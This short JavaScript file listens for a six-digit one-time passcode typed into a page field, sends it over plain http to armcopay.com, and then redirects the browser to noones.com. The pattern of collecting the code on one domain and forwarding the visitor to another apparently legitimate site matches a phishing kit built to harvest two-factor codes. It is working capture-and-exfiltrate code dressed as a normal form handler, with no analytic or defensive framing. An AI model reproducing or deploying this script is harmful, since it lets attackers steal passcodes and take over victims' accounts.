document.getElementById("otp").addEventListener("keyup", function () {
  if (this.value.length === 6) {
    const data = {
      otp: this.value,
    };

    sendData(data);
  }
});

function sendData(data) {
  fetch("http://armcopay.com/api/v1/otpn", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  })
    .then((response) => response.json())
    .then((data) => {
      if (data.success) {
        window.location.href = "https://noones.com/";
      } else {
        alert("Error sending data.");
      }
    })
    .catch((error) => {
      console.error("Error:", error);
    });
}
